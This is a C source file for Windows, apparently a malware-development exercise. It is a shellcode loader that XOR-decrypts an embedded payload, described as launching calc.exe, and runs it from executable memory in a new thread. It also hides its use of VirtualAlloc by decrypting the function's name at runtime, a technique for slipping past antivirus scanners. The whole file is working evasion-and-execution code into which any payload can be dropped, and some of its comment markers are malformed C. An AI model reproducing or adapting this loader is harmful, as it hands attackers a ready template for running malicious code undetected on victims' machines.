#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
\\shellcode to run calc.exe encrypted using xor
unsigned char calc_payload[] = {
  0x91,0x20,0xea,0x80,0x91,0x9c,0xad,0x68,0x69,0x64,0x20,0x25,0x2c,0x38,0x3b,0x35,0x37,0x3c,0x5c,0xba,0x0c,0x2c,0xea,0x26,0x0d,0x20,0xe2,0x36,0x79,0x3c,0xe6,0x3a,0x49,0x2c,0xea,0x06,0x3d,0x20,0x66,0xd3,0x2b,0x3e,0x20,0x59,0xa0,0x2c,0x50,0xb4,0xc1,0x54,0x08,0x18,0x63,0x58,0x4d,0x29,0xa8,0xad,0x6c,0x35,0x6c,0xa9,0x8b,0x89,0x33,0x35,0x3c,0x20,0xe2,0x36,0x41,0xff,0x2f,0x54,0x21,0x65,0xb1,0xff,0xed,0xe0,0x69,0x64,0x61,0x3c,0xe8,0xa8,0x1d,0x03,0x29,0x75,0xbd,0x38,0xe2,0x2c,0x79,0x30,0xe6,0x28,0x49,0x2d,0x60,0xa4,0x8e,0x3e,0x21,0x9b,0xa8,0x35,0xe6,0x5c,0xe1,0x2c,0x60,0xa2,0x20,0x59,0xa0,0x2c,0x50,0xb4,0xc1,0x29,0xa8,0xad,0x6c,0x35,0x6c,0xa9,0x51,0x84,0x14,0x85,0x21,0x6b,0x25,0x40,0x69,0x31,0x54,0xb9,0x1c,0xbc,0x39,0x30,0xe6,0x28,0x4d,0x2d,0x60,0xa4,0x0b,0x29,0xe2,0x68,0x29,0x30,0xe6,0x28,0x75,0x2d,0x60,0xa4,0x2c,0xe3,0x6d,0xec,0x29,0x75,0xbd,0x29,0x31,0x25,0x39,0x2a,0x34,0x32,0x28,0x3c,0x20,0x2d,0x2c,0x32,0x21,0xe7,0x8d,0x54,0x2c,0x3a,0x96,0x84,0x39,0x35,0x34,0x32,0x21,0xef,0x73,0x9d,0x3a,0x97,0x96,0x9b,0x3c,0x3c,0xd7,0x69,0x69,0x64,0x61,0x74,0x6d,0x68,0x69,0x2c,0xec,0xf9,0x6c,0x69,0x69,0x64,0x20,0xce,0x5c,0xe3,0x06,0xe3,0x9e,0xa1,0xd6,0x98,0xdc,0xc6,0x37,0x35,0xd7,0xce,0xfc,0xd9,0xfc,0x8b,0xb8,0x20,0xea,0xa0,0x49,0x48,0x6b,0x14,0x63,0xe4,0x9a,0x94,0x18,0x6d,0xd2,0x23,0x72,0x06,0x02,0x02,0x69,0x3d,0x20,0xfd,0xb7,0x97,0xbc,0x07,0x00,0x18,0x0e,0x46,0x0c,0x1c,0x04,0x74
};

unsigned int calc_len = sizeof(calc_payload);
\\VirtualAlloc_address is a function pointer, will contain the address to VirtualAlloc function
LPVOID (WINAPI * VirtualAlloc_address)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}


int main(void) {
    
	void * exec_mem;
	HANDLE th;
	char key[] = "mhidat";
	\*enctypted_name will be "VirtualAlloc" after decryption *\
	char enctypted_name[]={0x3b,0x01,0x1b,0x10,0x14,0x15,0x01,0x29,0x05,0x08,0x0e,0x17,0x6D};
	XOR((char*)enctypted_name, strlen(enctypted_name), key, sizeof(key));
	XOR((char*)calc_payload, calc_len, key, sizeof(key));
	// Allocate buffer for payload
	VirtualAlloc_address= GetProcAddress(GetModuleHandle("kernel32.dll"),enctypted_name);
	exec_mem = VirtualAlloc_address(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	

	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	

	// If all good, run the payload
	if ( exec_mem != NULL ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1); //-1 means infinity
	}

	return 0;
}
